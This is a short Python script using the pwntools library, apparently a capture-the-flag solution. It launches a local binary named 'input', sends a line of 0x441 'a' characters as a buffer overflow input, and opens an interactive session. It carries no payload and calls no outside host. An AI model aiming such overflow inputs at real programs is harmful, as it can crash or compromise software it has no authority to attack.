from pwn import *

p = process('input')


log.info(p.recvrepeat(0.2))

p.sendline('a'*0x441)
p.interactive()
